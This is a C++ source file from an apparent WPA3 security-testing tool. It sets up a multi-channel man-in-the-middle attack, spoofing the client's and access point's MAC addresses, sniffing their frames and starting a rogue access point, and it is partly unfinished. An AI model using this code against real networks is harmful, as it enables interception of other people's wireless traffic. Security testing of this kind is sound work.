// TODO
// this wrapper is slow (python)
// https://github.com/vanhoefm/mc-mitm?tab=readme-ov-fil
//
//
#include "attacks/by_target/scan_AP.h"
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "config/RunStatus.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::mc_mitm{

    void setup_attack(RunStatus& rs){
        components::client_ap_attacker_setup(rs);

        const auto att_real_channel = rs.get_actor("att_real_channel");
        const auto att_rogue_channel = rs.get_actor("att_rogue_channel");
        const auto ap = rs.get_actor("access_point");

        att_real_channel["channel"] = ap["channel"];
        // rogue channel that doesn't overlap the real one - 1-11 are global valid channels //TODO check
        att_rogue_channel["channel"] = (stoi(att_real_channel["channel"]) >= 6) ? 1 : 11;
    }

    void run_attack(RunStatus& rs){

        const auto att_real_channel = rs.get_actor("att_real_channel");
        const auto att_rogue_channel = rs.get_actor("att_rogue_channel");
        const auto ap = rs.get_actor("access_point");
        const auto client = rs.get_actor("client");

        McMitm attack(att_real_channel["iface"], att_rogue_channel["iface"],
            att_real_channel["sniff_iface"], att_rogue_channel["sniff_iface"],
            ap["ssid"], client["mac"], true);
        //attack.run();

        const bool check_rogue_beacons =
            (hw_capabilities::get_driver_name(att_real_channel["sniff_iface"]) == "ath9k_htc");
        hw_capabilities::set_macaddress(att_real_channel["iface"], client["mac"]);
        hw_capabilities::set_macaddress(att_rogue_channel["iface"], ap["mac"]);

        auto sender_real  = make_unique<PacketSender>(att_real_channel["sniff_iface"]);
        auto sender_rogue = make_unique<PacketSender>(att_rogue_channel["sniff_iface"]);

        string bpf = "(wlan addr1 " + ap["mac"] + ") or (wlan addr2 " + ap["mac"] + ")";
        bpf += " or (wlan addr1 " + client["mac"] + ") or (wlan addr2 " + client["mac"] + ")";
        bpf = "(wlan type data or wlan type mgt) and (" + bpf + ")";

        SnifferConfiguration cfg_real, cfg_rogue;
        cfg_real.set_filter(bpf);
        cfg_rogue.set_filter(bpf);
        cfg_real.set_immediate_mode(true);
        cfg_rogue.set_immediate_mode(true);

        //TODO move to actor:setup ?
        auto sniffer_real  = make_unique<Sniffer>(att_real_channel["sniff_iface"],  cfg_real);
        auto sniffer_rogue = make_unique<Sniffer>(att_rogue_channel["sniff_iface"], cfg_rogue);
        attack_scan::ScanAP scan_ap{};

        scan_ap.bssid = ap["mac"];
        const auto beacon = RSN_scan(att_real_channel["iface"], 10, scan_ap);
        start_ap(att_rogue_channel["iface"], stoi(att_rogue_channel["channel"]), beacon.get());
        log(LogLevel::INFO, "Giving the rogue AP one second to initialize ...");
        this_thread::sleep_for(seconds(1));

    }

    /*void stats(const RunStatus& rs){
    }*/
}
